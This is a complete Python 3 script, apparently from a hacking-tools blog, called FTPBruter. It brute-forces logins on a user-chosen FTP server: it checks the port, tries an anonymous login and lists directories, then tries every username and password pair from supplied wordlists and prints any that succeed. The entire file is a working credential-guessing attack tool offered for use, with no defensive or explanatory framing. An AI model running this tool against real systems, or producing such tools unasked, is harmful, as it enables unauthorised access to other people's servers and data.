#!/usr/bin/python3

# _*_ coding:utf-8 _*_

import socket
from os import path, system, name
from ftplib import FTP

#default port for FTP
PORT = 21

def banner():
    print("""\033[93m ______   _______   _____    ____                   _                 
|  ____| |__   __| |  __ \  |  _ \                 | |                
| |__       | |    | |__) | | |_) |  _ __   _   _  | |_    ___   _ __ 
|  __|      | |    |  ___/  |  _ <  | '__| | | | | | __|  / _ \ | '__|
| |         | |    | |      | |_) | | |    | |_| | | |_  |  __/ | |   
|_|         |_|    |_|      |____/  |_|     \__,_|  \__|  \___| |_|   \033[1;93m1.0\033[0m
\033[1;92m[i]\033[0m\033[37m FTPBruter - A FTP server Brute forcing tool written in Python 3
    Author:\033[1;93m https://GitHackTools.blogspot.com \033[0m""")


def clear():
    if name == 'nt':
        system('cls')
    else:
        system('clear')

def anonymous(target,username,password):
    try:
        ftp = FTP()
        ftp.connect(target,PORT)
        ftp.login(username, password)
        #ftp.quit()
        print("\033[1;93m[i]\033[37m Anonymous Login Allowed!")
        ftp.dir() #listing directories
        ftp.quit()
    except:
        print("\033[1;91m[!]\033[37m Anonymous Login Not Allowed!")
    


def main():
    global PORT
    try:
        print()
        target = str(input('\033[1;96m[-]\033[37m Enter the target address: \033[0m'))

        #port checking required if ftp is not running on default port
        PORT = input("\033[1;96m[-]\033[37m Enter the Port [Default 21]: \033[0m")

        if PORT == '':
            PORT = 21
        else:
            PORT = int(PORT)

        if check_port(target) == True:
            
            #anonymous login checking!
            print('\033[1;96m[+]\033[37m Checking for Anonymous login:')
            anonymous(target,'anonymous','anonymous')

            choice = str(input("\033[1;96m[?]\033[37m Do you want to use username list? [Y/n]: \033[0m"))
            
            if choice[0].upper() == 'N':
                username = str(input('\033[1;96m[-]\033[37m Enter username: \033[0m'))
                check_wordlist(target, username)

            elif choice[0].upper() == 'Y':
                check_userlist(target)

        else:
            print('\033[1;91m[!]\033[37m The port 21 is not open! Are you sure that is the FTP server?\033[0m')
            main()

    except KeyboardInterrupt:
        print()
        print("Exiting...")
        exit()                

def check_port(target):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        port = sock.connect_ex((target,int(PORT)))

        if port == 0:
            sock.close
            return True
        else:
            sock.close
            return False

    except socket.gaierror:
        print('\033[1;91m[!]\033[37m Name or service not known\033[0m')
        main()

def check_userlist(target):
    try:
        username = str(input('\033[1;96m[-]\033[37m Enter the path of user list: \033[0m'))   
        username = username.strip()

        if path.isfile(username) == True:
            wordlist = str(input('\033[1;96m[-]\033[37m Enter the path of wordlist: \033[0m'))
            wordlist = wordlist.strip()

            if path.isfile(wordlist) == True:
                brute_force_list(target, username, wordlist)

            else:
                print("\033[1;91m[!]\033[37m That path is doesn't exist\033[0m")
                print()
                check_userlist(target)

        else:
            print("\033[1;91m[!]\033[37m That path is doesn't exist\033[0m")
            print()
            check_userlist(target)

    except KeyboardInterrupt:
        print()
        print("Exiting...")
        exit()

def check_wordlist(target, username):
    try:
        wordlist = str(input('\033[1;96m[-]\033[37m Enter the path of wordlist: \033[0m'))
        wordlist = wordlist.strip()
        
        if path.isfile(wordlist) == True:
            brute_force(target, username, wordlist)
            
        else:
            print("\033[1;91m[!]\033[37m That path is doesn't exist! \033[0m")
            print()
            check_wordlist(target, username)
            
    except KeyboardInterrupt:
        print()
        print("Exiting...")
        exit()

def brute_force(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r", buffering=25000)
        passwords = wordlist.readlines()
        print('\033[1;92m[i]\033[37m Brute force is performing...\033[0m')

        for password in passwords:
            password = password.strip()
            ftpbruter(target, username, password)
            
    except KeyboardInterrupt:
        print()
        print('Exiting...')
        exit()

def brute_force_list(target, username, wordlist):
    try:
        wordlist = open(wordlist, "r", buffering=25000)
        username = open(username, "r", buffering=25000)
        passwords = wordlist.readlines()
        users = username.readlines()
        print('\033[1;92m[i]\033[37m Brute force is performing...\033[0m')

        for user in users:
            user = user.strip()
            for password in passwords:
                password = password.strip()
                ftpbruter(target, user, password)

    except KeyboardInterrupt:
        print()
        print('Exiting...')
        exit()

def ftpbruter(target, username, password):
    try:
        ftp = FTP(target)
        ftp.connect(target,PORT)
        ftp.login(username, password)
        ftp.quit()
        print()
        print("\033[1;92m[i]\033[1;37m Brute force has done!")
        print("    Username : \033[1;93m",username)
        print("    \033[1;37mPassword : \033[1;93m",password)
        print()
        print("\033[1;92m[i]\033[1;37m Press Ctrl+C to exit right now!\033[0m")

    except KeyboardInterrupt:
        exit()
    except:
        pass

clear()
banner()
main()
